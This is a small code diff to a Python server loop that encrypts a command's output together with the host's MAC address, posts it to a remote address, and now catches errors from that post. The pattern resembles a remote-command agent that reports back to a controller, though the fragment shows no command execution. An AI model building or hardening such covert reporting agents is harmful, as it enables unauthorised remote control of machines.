@@ -138,8 +138,10 @@ def start_server():
 
                     txt = eu.encrypt1(f"{mac}\n{txt}")
                     headers = {'Content-Type': 'text/plain'}
-                    r2 = requests.post(ip, data=txt, headers=headers)
-                    if r2.status_code == 200: print(f"Successfully sent response for {cmd}")
+                    try:
+                        r2 = requests.post(ip, data=txt, headers=headers)
+                        if r2.status_code == 200: print(f"Successfully sent response for {cmd}")
+                    except Exception as e: print(f"Error in post: {e}")
 
 if __name__ == '__main__':
     start_server()
